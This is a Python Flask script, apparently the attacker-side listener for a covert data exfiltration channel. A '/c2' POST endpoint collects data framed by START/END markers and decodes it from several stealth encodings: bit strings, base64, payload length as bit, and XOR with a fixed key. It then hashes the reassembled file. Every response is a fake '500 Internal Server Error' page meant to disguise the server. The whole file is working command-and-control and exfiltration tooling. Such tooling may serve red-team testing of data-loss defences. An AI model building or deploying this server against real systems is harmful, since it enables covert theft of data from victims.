from flask     import Flask, request
import base64
import os
import hashlib
import logging

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# Definir variables
message = "<!DOCTYPE html><html><head><title>500 Internal Server Error</title></head><body><h1>500 Internal Server Error</h1><p>Something went wrong on the server.</p></body></html>"
transmitting        = False
receivedData        = bytearray()
encodingMethod      = None
secondDecodeProcess = None
indexData           = 0

# Carpeta para guardar los archivos reconstruidos
outputFolder = "output"
os.makedirs(outputFolder, exist_ok=True)


@app.route('/', methods=['GET'])
def endpointA():
    global message
    return message, 500

# Ruta para recibir datos
@app.route('/c2', methods=['POST'])
def endpoint():
    global receivedData
    global transmitting
    global encodingMethod
    global secondDecodeProcess
    global indexData
    global message
    START_WORD = b"START010203"
    END_WORD   = b"END010203"
    
    # Obtiene el payload recibido
    payload = request.data
    payload = payload.split(b'|')

    # Inicio transmisión
    if START_WORD in payload:
        print("\n[+] Inicio recepción.")
        transmitting = True
        # Reinicializar variables
        receivedData        = bytearray()
        encodingMethod      = None
        secondDecodeProcess = None
        indexData           = 0
    
    # Fin transmisión
    elif END_WORD in payload and transmitting:
        print("[+] Fin recepcion.")

        if secondDecodeProcess:
            secondDecodeProcess, indexData, receivedData = decodeData(encodingMethod=secondDecodeProcess, indexData=indexData, encodedData=receivedData)

        getHashData(data=receivedData)
        # Reinicializar variables
        transmitting        = False
        receivedData        = bytearray()
        encodingMethod      = None
        secondDecodeProcess = None
        indexData           = 0

    # Captura método codificación
    elif transmitting and not encodingMethod:
        encodingMethod = payload[0].decode("utf-8")
        encodingMethod = encodingMethod.split("To")
        encodingMethod = 'To'.join(encodingMethod[::-1])
        # Imprimir método codificación        
        print(f"[+] Método codificación: {encodingMethod}")

    # Captura datos fichero
    elif transmitting and encodingMethod:
        for encodedData in payload:
            secondDecodeProcess, indexData, data = decodeData(encodingMethod=encodingMethod, indexData=indexData, encodedData=encodedData)
            receivedData.extend(data)

    return message, 500


def getHashData(data):
    _hash = hashlib.new('sha256')
    _hash.update(data)
    print(f'[+] Hash: {_hash.hexdigest()}')


def decodeData(encodingMethod, encodedData, indexData=0):
    secondDecodeProcess = None
    data                = None
    
    # Decodificar bit en Bytes
    if encodingMethod == "BitsToByte":
        # Convertir byte a carácter
         data = bytes(int(encodedData[index:index+8], 2) for index in range(0, len(encodedData), 8))

    # Convertir base64 a byte
    elif encodingMethod == "Base64ToByte":
        data = base64.b64decode(encodedData)

    # Convertir representación bit por tamaño cadena a bit y bit a byte
    elif encodingMethod == "PayloadSizeToBitToByte":
        if len(encodedData) == 1: data = b"0" # Tamaño 1 para bit 0
        else:                     data = b"1" # Tamaño 2 para bit 1
        secondDecodeProcess = "BitsToByte"

    elif encodingMethod == "XorToByte":
        key = b"key"
        encodedData = int(encodedData)
        data        = encodedData ^ key[indexData % len(key)]
        data        = data.to_bytes(1, byteorder='big')
        indexData   += 1

    # Si no está contemplado
    else:
        print("[+] No existe método de decodificación")
    
    return secondDecodeProcess, indexData, data

if __name__ == '__main__':
    app.run(debug=False, port=5000)